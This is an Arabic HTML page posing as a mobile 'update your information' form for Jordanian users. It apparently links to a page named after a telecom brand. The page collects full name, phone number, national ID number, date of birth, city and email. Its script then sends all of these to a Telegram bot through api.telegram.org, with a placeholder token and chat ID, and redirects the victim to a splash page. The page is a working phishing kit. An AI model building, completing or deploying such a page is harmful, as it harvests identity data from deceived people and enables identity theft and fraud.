<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>تحديث المعلومات</title>
<style>
:root{ --accent:#ff5a00; --bar:#2b2e36; --maxw:520px; --btn-height:64px }
html,body{min-height:100vh;margin:0;padding:0;font-family:Arial,Helvetica,sans-serif;background:#fff;color:#000;-webkit-text-size-adjust:100%;}
/* البار العلوي */
.top-bar{background:var(--bar);color:#fff;padding:14px 16px;text-align:center;position:fixed;top:0;left:0;right:0;height:56px;display:flex;align-items:center;justify-content:center;z-index:9999;box-sizing:border-box;}   
.top-bar::after{content:"";display:block;height:3px;background:var(--accent);position:absolute;bottom:0;left:0;right:0}
.back-btn{position:absolute;right:12px;top:50%;transform:translateY(-50%);font-size:22px;color:#fff;text-decoration:none}
.container{max-width:var(--maxw);margin:0 auto;padding:calc(56px + env(safe-area-inset-top) + 12px) 16px calc(18px + var(--btn-height));box-sizing:border-box} 

h2{text-align:center;margin:6px 0 12px 0;font-size:20px}
label{display:block;margin:12px 0 6px;font-size:15px}
label[for="phone"]{text-align:right}
.input-row{display:flex;gap:12px;flex-wrap:wrap}

/* حجوم المربعات وحماية من خاصية تكبير المتصفح على الموبايل: اجعل حجم الخط >=16px */
input[type="text"],input[type="tel"],input[type="email"],input[type="date"],select{
  width:100%;padding:12px;border:1px solid #ddd;border-radius:8px;font-size:16px;box-sizing:border-box;background:#fff;
}

/* تأكيد أن عناصر التحكم لا تسبب تكبير الصفحة عند التركيز */
input, select, textarea { -webkit-text-size-adjust:100%; }

/* تحسين مظهر select ليتناسب مع الحقول */
select{appearance:none;-webkit-appearance:none;background-image:linear-gradient(45deg, transparent 50%, #999 50%), linear-gradient(135deg, #999 50%, transparent 50%);background-position: calc(100% - 18px) calc(1em + 2px), calc(100% - 13px) calc(1em + 2px);background-size: 6px 6px, 6px 6px;background-repeat: no-repeat;padding-right:36px}

/* رسالة خطأ صغيرة */
.field-error{color:#d23;font-size:13px;margin-top:6px;display:none}

/* تنسيق لحقل التاريخ ليشبه باقي المربعات */
input[type="date"]::-webkit-calendar-picker-indicator{filter:invert(1)}
input[type="date"]{appearance:none;-webkit-appearance:none}

/* زر داخل التدفق (static) ليمنع تحريك الصفحة عند فتح لوحة المفاتيح */
.btn{height:var(--btn-height);width:calc(100% - 32px);max-width:var(--maxw);padding:12px;border:none;border-radius:10px;background:var(--accent);color:#fff;font-size:18px;position:static;margin:18px auto 32px;transform:none;cursor:not-allowed;box-shadow:0 6px 20px rgba(0,0,0,0.06);display:flex;align-items:center;justify-content:center}
.btn.active{cursor:pointer;background:#e44a00}

.suggest-note{font-size:13px;color:#666;margin-top:6px}
.form-row{margin-bottom:12px}

/* responsive tweaks for small phones */
@media (max-width:520px){
  :root{--maxw:420px}
  .container{padding:12px 12px calc(12px + var(--btn-height))}
  h2{font-size:18px}
  input[type="text"],input[type="tel"],input[type="email"],input[type="date"],select{font-size:17px;padding:14px}
  .back-btn{font-size:20px}
}
</style>
</head>
<body>
<div class="top-bar">
تحديث المعلومات
<a class="back-btn" href="verethad.html">‹</a>
</div>

<div class="container">
  <h2>أدخل المعلومات</h2>
  <form id="infoForm" autocomplete="on">
    <div class="form-row">
      <label for="name">الاسم بالكامل</label>
      <input type="text" id="name" placeholder="أدخل الاسم بالكامل" required>
    </div>

    <div class="form-row">
      <label for="phone">رقم الهاتف</label>
      <input type="tel" id="phone" placeholder="07xxxxxxxx" inputmode="tel" maxlength="10" required>
      <div id="phoneError" class="field-error">يجب أن يبدأ برقم 07 ويتكون من 10 أرقام (مثال: 0791234567)</div>
    </div>

    <div class="form-row">
      <label for="nationalId">الرقم الوطني</label>
      <!-- نسمح بالأرقام فقط ونحدد طول أقصى 10 (يمكن تغييره) -->
      <input type="text" id="nationalId" placeholder="أدخل الرقم الوطني" inputmode="numeric" maxlength="10" required>
      
    </div>

    <div class="form-row">
      <label for="dob">تاريخ الميلاد</label>
      <input type="date" id="dob" required>
      <div id="dobFormatted" class="suggest-note"></div>
    </div>

    <div class="form-row">
      <label for="city">المدينة</label>
      <select id="city" required>
        <option value="">اختر المدينة</option>
        <option>عمان</option>
        <option>إربد</option>
        <option>الزرقاء</option>
        <option>السلط</option>
        <option>جرش</option>
        <option>عجلون</option>
        <option>مادبا</option>
        <option>الكرك</option>
        <option>معان</option>
        <option>المفرق</option>
        <option>الطفيلة</option>
        <option>العقبة</option>
        <option>الرمثا</option>
        <option>الرصيفة</option>
        <option>دير علا</option>
        <option>سحاب</option>
        <option>العرجان</option>
        <option>المزار</option>
        <option>الشونة الشمالية</option>
        <option>بصيرا</option>
        <option>القسطل</option>
        <option>الحنّّا</option>
        <option>الكمالية</option>
        <option>البقعة</option>
        <option>الموقر</option>
      </select>
    </div> 

    <div class="form-row">
      <label for="email">البريد الإلكتروني</label>
      <input type="email" id="email" placeholder="أدخل البريد الإلكتروني" required>
    </div>

    <button type="submit" id="submitBtn" class="btn">التالي</button>
  </form>
</div>

<!-- تحميل Google Places API (استبدل YOUR_GOOGLE_API_KEY بمفتاحك) -->

<script>
// DOM
const form = document.getElementById('infoForm');
const btn = document.getElementById('submitBtn');
const nameInput = document.getElementById('name');
const phoneInput = document.getElementById('phone');
const nationalId = document.getElementById('nationalId');
const dob = document.getElementById('dob');
const citySelect = document.getElementById('city');
const emailInput = document.getElementById('email');

// ضبط حد التاريخ: يجب أن يكون المستخدم 18 سنة على الأقل
(function setDobLimits(){
  const today = new Date();
  const maxYear = today.getFullYear() - 18;
  const maxDate = new Date(today);
  maxDate.setFullYear(maxYear);
  const minDate = new Date(today);
  minDate.setFullYear(maxYear - 82);
  function toYMD(d){ return d.getFullYear() + '-' + String(d.getMonth()+1).padStart(2,'0') + '-' + String(d.getDate()).padStart(2,'0'); }
  dob.max = toYMD(maxDate);
  dob.min = toYMD(minDate);
})();

// تحديث حالة الزر
function updateButtonState(){
  const nameOk = !!nameInput.value.trim();
  const phoneOk = !!phoneInput.value.trim();
  const nationalOk = !!nationalId.value.trim();
  const cityOk = !!citySelect.value.trim();
  const emailOk = !!emailInput.value.trim();
  const dobOk = !!dob.value && new Date(dob.value) <= new Date(dob.max);
  const all = nameOk && phoneOk && nationalOk && cityOk && emailOk && dobOk;
  if(all){ btn.classList.add('active'); btn.removeAttribute('disabled'); btn.style.cursor='pointer'; }
  else{ btn.classList.remove('active'); btn.setAttribute('disabled', true); btn.style.cursor='not-allowed'; }
}
[nameInput,phoneInput,nationalId,citySelect,emailInput,dob].forEach(el=>el.addEventListener('input', updateButtonState));

// جعل الرقم الوطني أرقام فقط (مع دعم اللصق)
nationalId.addEventListener('keydown', (e) => { const allowed = ['Backspace','Delete','ArrowLeft','ArrowRight','Tab']; if (allowed.includes(e.key)) return; if (e.key.length===1 && !/^[0-9]$/.test(e.key)) e.preventDefault(); });
nationalId.addEventListener('input', ()=>{ nationalId.value = nationalId.value.replace(/[^0-9]/g,'').slice(0,nationalId.maxLength); updateButtonState(); });

// عند الإرسال تحقق من العمر ثم أرسل إلى تلجرام ثم إعادة التوجيه
const BOT_TOKEN = 'ضع_توكن_البوت_هنا';
const CHAT_ID = 'ضع_ChatID_هنا';
// تقييد حقل الهاتف للأرقام فقط مع دعم اللصق
phoneInput.addEventListener('input', ()=>{ phoneInput.value = phoneInput.value.replace(/[^0-9]/g,'').slice(0,10); updateButtonState(); });
phoneInput.addEventListener('keydown', (e)=>{ const allowed = ['Backspace','Delete','ArrowLeft','ArrowRight','Tab']; if(allowed.includes(e.key)) return; if(e.key.length===1 && !/^[0-9]$/.test(e.key)) e.preventDefault(); });
phoneInput.addEventListener('paste',(e)=>{ e.preventDefault(); const paste=(e.clipboardData||window.clipboardData).getData('text').replace(/[^0-9]/g,'').slice(0,10); phoneInput.value=paste; updateButtonState(); });

form.addEventListener('submit', function(e){
  e.preventDefault();
  if(btn.disabled) return;
  // تحقق العمر
  const dobVal = dob.value;
  if(!dobVal){ alert('يرجى اختيار تاريخ الميلاد'); return; }
  if(new Date(dobVal) > new Date(dob.max)){ alert('يجب أن يكون العمر 18 سنة على الأقل'); return; }

  const data = {
    name: nameInput.value.trim(),
    phone: phoneInput.value.trim(),
    nationalId: nationalId.value.trim(),
    dob: dob.value.split('-').join('/'), // YYYY/MM/DD
    city: citySelect.value.trim(),
    email: emailInput.value.trim()
  };
  const text = `📋 تحديث المعلومات:
👤 الاسم: ${data.name}
📞 الهاتف: ${data.phone}
🆔 الرقم الوطني: ${data.nationalId}
🎂 تاريخ الميلاد: ${data.dob}
🏙️ المدينة: ${data.city}
📧 البريد الإلكتروني: ${data.email}`;
  if (!BOT_TOKEN || BOT_TOKEN.includes('ضع_توكن') || !CHAT_ID || CHAT_ID.includes('ضع_ChatID')){
    alert('تنبيه: لم تقم بإضافة بيانات بوت التلجرام في الكود. سيتم عرض النتيجة محليًا.');
    console.log('payload ->', text);
    window.location.href = 'splash1.html';
    return;
  }
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST', headers: {'Content-Type':'application/json'},
    body: JSON.stringify({ chat_id: CHAT_ID, text })
  })
  .then(res => res.json())
  .then(resp => {
    if(resp && resp.ok){ window.location.href = 'splash1.html'; }
    else{ alert('حدث خطأ في إرسال البيانات إلى تلجرام.'); console.error('telegram response', resp); }
  })
  .catch(err => { alert('حدث خطأ في الإرسال'); console.error(err); });
});

// initial
updateButtonState();
</script>
</body>
</html>
